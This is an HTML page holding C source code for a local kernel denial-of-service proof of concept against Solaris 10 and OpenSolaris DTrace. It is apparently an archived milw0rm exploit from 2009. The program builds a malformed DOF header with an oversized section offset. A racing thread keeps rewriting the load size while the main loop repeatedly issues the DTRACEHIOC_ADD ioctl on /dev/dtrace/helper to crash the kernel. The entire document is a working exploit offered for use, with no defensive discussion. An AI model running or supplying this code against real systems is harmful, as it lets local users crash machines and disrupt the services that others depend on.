<html><head><title>Solaris 10 / OpenSolaris (dtrace) Local Kernel Denial of Service PoC</title></head><pre>/* solaris-dtrace-dos.c
 *
 * Copyright (c) 2008 by &lt;mu-b@digit-labs.org&gt;
 *
 * Solaris &gt;= 10/Opensolaris local kernel DoS POC
 * by mu-b - Mon 17 Nov 2008
 *
 * - Tested on:  Sun Solaris 10 (SPARC)
 *               Sun OpenSolaris &lt;= snv_113 (x86)
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;assert.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;pthread.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

#include &lt;dtrace.h&gt;

#define DTRACE_HELPER &quot;/dev/dtrace/helper&quot;

static unsigned int changes = 0;

void *
hammer (void *arg)
{
  struct dof_hdr *phdr;

  phdr = arg;
  while (1)
    {
      phdr-&gt;dofh_loadsz = -1;
      changes++;

      usleep (10);
    }
}

int
main (int argc, char **argv)
{
  union {
    struct dof_hdr hdr;
    unsigned char buf[256*1024];
  } hdr_t;
  struct dof_hdr *phdr;
  int i, fd, n, tid;

  printf (&quot;Solaris &gt;= 10/Opensolaris local kernel DoS PoC\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot;
          &quot;http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n&quot;);

  fd = open (DTRACE_HELPER, O_RDONLY);
  if (fd &lt; 0)
    {
      fprintf (stderr, &quot;failed opening %s\n&quot;, DTRACE_HELPER);
      return (EXIT_FAILURE);
    }

  phdr = &amp;hdr_t.hdr;
  memset (phdr, 0, sizeof *phdr);

  memcpy (&amp;phdr-&gt;dofh_ident, DOF_MAG_STRING, DOF_MAG_STRLEN);
  phdr-&gt;dofh_ident[DOF_ID_MODEL] = DOF_MODEL_LP64;
  phdr-&gt;dofh_ident[DOF_ID_ENCODING] = DOF_ENCODE_NATIVE;
  phdr-&gt;dofh_ident[DOF_ID_VERSION] = DOF_VERSION_2;
  phdr-&gt;dofh_ident[DOF_ID_DIFVERS] = DOF_VERSION_2;
  phdr-&gt;dofh_ident[DOF_ID_DIFIREG] = DIF_DIR_NREGS;
  phdr-&gt;dofh_ident[DOF_ID_DIFTREG] = DIF_DTR_NREGS;
  phdr-&gt;dofh_secsize = 1024;
  phdr-&gt;dofh_secnum = 1024;
  phdr-&gt;dofh_secoff = 0x7fffffffffff0000;

  n = pthread_create (&amp;tid, NULL, hammer, phdr);
  if (n &lt; 0)
    {
      fprintf (stderr, &quot;failed creating hammer thread\n&quot;);
      return (EXIT_FAILURE);
    }

  for (i = 0; ; i++)
    {
      phdr-&gt;dofh_loadsz = sizeof hdr_t / 2;
      n = ioctl (fd, DTRACEHIOC_ADD, phdr);
      assert (n == -1);

      if (!(i % 64))
        printf (&quot;tried %d-times, %d-changes\r&quot;, i, changes);
    }

  /* not reached! */
  return (EXIT_SUCCESS);
}

// milw0rm.com [2009-05-04]</pre></html>